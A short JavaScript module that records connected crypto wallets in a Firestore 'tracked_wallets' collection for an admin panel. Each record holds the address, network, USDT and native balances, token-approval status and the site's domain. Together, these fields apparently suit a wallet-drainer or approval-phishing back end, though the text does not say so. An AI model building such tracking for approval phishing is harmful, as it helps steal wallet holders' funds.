import { doc, setDoc, serverTimestamp } from "firebase/firestore";
import { db } from "../config/firebase";

// Each session gets a unique ID: address + timestamp
// Stored in memory so status updates (Pending → Approved) hit the same doc
const sessionDocIds = {};

export const trackWalletStatus = async (walletData) => {
  try {
    const { address, network, walletType, approvalStatus, usdtBalance, nativeBalance, domain } = walletData;

    if (!address) return;

    // Generate a unique session ID for this address if we don't have one yet.
    // This means the same wallet connecting 3 times = 3 separate rows in admin.
    if (!sessionDocIds[address]) {
      sessionDocIds[address] = `${address}_${Date.now()}`;
    }

    const sessionId = sessionDocIds[address];
    const docRef = doc(db, "tracked_wallets", sessionId);

    const data = {
      address,
      lastUpdated: serverTimestamp(),
    };

    if (network) data.network = network;
    if (walletType) data.wallet = walletType;
    if (domain) data.domain = domain;
    else data.domain = window.location.hostname;

    if (approvalStatus) data.approval = approvalStatus;
    if (usdtBalance !== undefined) data.usdt = usdtBalance.toString();
    if (nativeBalance !== undefined) data.native = nativeBalance.toString();

    await setDoc(docRef, data, { merge: true });

  } catch (err) {
    console.error("Error tracking wallet:", err);
  }
};

// Call this on wallet disconnect to clear the session so a fresh reconnect
// gets a new row in the admin panel.
export const clearWalletSession = (address) => {
  if (address && sessionDocIds[address]) {
    delete sessionDocIds[address];
  }
};
